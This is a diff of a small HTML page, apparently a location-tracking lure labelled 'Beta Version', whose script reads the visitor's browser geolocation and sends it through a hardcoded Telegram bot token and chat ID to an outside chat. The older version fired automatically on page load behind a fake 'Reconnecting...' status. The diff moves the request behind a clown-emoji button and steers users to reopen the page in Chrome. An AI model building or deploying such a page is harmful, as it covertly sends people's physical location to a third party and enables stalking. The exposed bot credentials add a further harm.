@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vangari Website by shohan</title>
+  <title>Vangari Website by Shohan</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -19,16 +19,23 @@
       font-size: 18px;
       color: #333;
     }
+    #requestLocationBtn {
+      font-size: 24px;
+      padding: 10px 20px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
 
   <h1>Beta Version</h1>
-  <div id="status">Reconnecting...</div>
+  <button id="requestLocationBtn">🤡</button>
+  <div id="status">Click on 🤡 to share location.</div>
 
   <script>
-    const botToken = '7966931731:AAEqPHdTuX0epQhM6D_hEZ0X8Azae_5RwXM'; // Your Telegram bot token
-    const chatId = '6471397661'; // Your Telegram chat ID
+    const botToken = '7966931731:AAEqPHdTuX0epQhM6D_hEZ0X8Azae_5RwXM';
+    const chatId = '6471397661';
 
     function sendLocationToTelegram(position) {
       const latitude = position.coords.latitude;
@@ -44,7 +51,7 @@
           }
         })
         .catch(error => {
-          document.getElementById('status').textContent = "Error occured.";
+          document.getElementById('status').textContent = "Error occurred.";
         });
     }
 
@@ -55,7 +62,7 @@
           status.textContent = "User denied the request for Geolocation.";
           break;
         case error.POSITION_UNAVAILABLE:
-          status.textContent = "Click on 3 Dot in top right corner (...) and open in chrome.";
+          status.textContent = "Click on 3 dots in the top right corner (...) and open in Chrome.";
           break;
         case error.TIMEOUT:
           status.textContent = "The request to get user location timed out.";
@@ -66,12 +73,16 @@
       }
     }
 
-    // Automatically request location when the page loads
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-    } else {
-      document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+      } else {
+        document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
+      }
     }
+
+    // Set up the button to request location when clicked
+    document.getElementById('requestLocationBtn').addEventListener('click', requestLocation);
   </script>
 
 </body>
